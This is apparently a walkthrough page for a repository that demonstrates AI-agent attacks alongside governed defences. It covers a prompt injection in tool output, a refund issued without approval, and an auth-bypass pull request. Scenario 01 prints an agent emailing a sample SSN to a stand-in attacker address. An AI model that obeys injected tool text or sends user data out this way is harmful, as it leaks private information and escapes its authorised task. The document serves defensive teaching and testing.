# Recommended path

The fastest way to understand this repo is to watch one attack fail unsafely, understand why,
then watch the governed path stop it — and repeat across a few scenarios. Every command below is
copy-pasteable and consistent with the [`Makefile`](../Makefile). Terms in **bold** are in the
[glossary](glossary.md).

## 0. Set up

```bash
make setup   # editable install with dev extras (pytest, ruff)
make test    # confirm everything runs (all scenarios, both paths)
```

## 1. See an unsafe failure: prompt injection (scenario 01)

```bash
make run-unsafe SCENARIO=01_prompt_injection_in_tool_result
```

The injected tool output steers the agent into emailing an SSN to `attacker@evil.test`. The
risky action is right there in the output:

```text
'risky_action': {'mode': 'sent', 'to': 'attacker@evil.test', 'subject': 'Sensitive export', 'body': 'SSN: 111-22-3333'}
```

## 2. Understand why it failed

Read the scenario walkthrough:
[`scenarios/01_prompt_injection_in_tool_result/README.md`](../scenarios/01_prompt_injection_in_tool_result/README.md)
and its [`expected_failure.md`](../scenarios/01_prompt_injection_in_tool_result/expected_failure.md).
The root cause: untrusted tool output is treated as trusted instructions.

## 3. Run the governed version

```bash
make run-safe SCENARIO=01_prompt_injection_in_tool_result
```

```text
{'status': 'blocked', 'decision': {'effect': 'deny', 'reason': 'Sensitive data exfiltration is denied.'}, 'trace_path': 'traces/01_..._....json'}
```

Two controls applied: the **context firewall** rewrote the injected text, and the **policy
engine** denied `exfiltrate / sensitive_data`. See how they compose in the
[security model](security-model.md#how-the-layers-compose-worked-example).

## 4. Inspect the policy decision

The decision (`effect` + `reason`) is in the run output above and in the audit trace. The rule
itself is in [`policies/default_policy.yaml`](../policies/default_policy.yaml).

## 5. Inspect the audit trace

Open a committed sample:
[`traces/sample_safe_trace_01.json`](../traces/sample_safe_trace_01.json). Every governed run
writes one like it to `traces/` (or `DOJO_TRACE_DIR`), recording `decisions` and `actions`.

## 6. Compare the deterministic refund flow (scenario 04)

```bash
make run-unsafe SCENARIO=04_refund_without_human_approval
make run-safe   SCENARIO=04_refund_without_human_approval
```

Unsafe issues a $350 refund outright. Governed runs the **deterministic flow**
([`run_refund_review`](../src/dojo/flows/refund_review.py)), computes an `evidence_score`, and
returns `approval_required` because the amount crosses the threshold. Sample trace:
[`traces/sample_safe_trace_04.json`](../traces/sample_safe_trace_04.json).

## 7. Inspect a reviewed lesson

Scenario 07 surfaces **reviewed lessons** in its governed output. The curated set lives in
[`src/dojo/lessons/reviewed_lessons.py`](../src/dojo/lessons/reviewed_lessons.py):

```bash
make run-safe SCENARIO=07_ai_generated_auth_bypass_pr
```

## 8. Run the rest

Run all remaining scenarios in both modes to see the full unsafe-vs-governed contrast (02, 03,
05, 06). `make demo` currently runs scenario 01 in both modes; a one-shot all-scenario demo is
tracked in #7.

## 9. Read the library map

Finally, [`docs/library-map.md`](library-map.md) explains the **Weaver Stack** each control is
modeled on, with correct install/import names and the current stub-vs-integrated status.

> Note on offline evaluation: a `make eval-policy` offline-evaluation step (`skdr-eval`) is part
> of the roadmap but **not yet implemented** (tracked in #39 and #49), so it is intentionally
> omitted from this walkthrough.
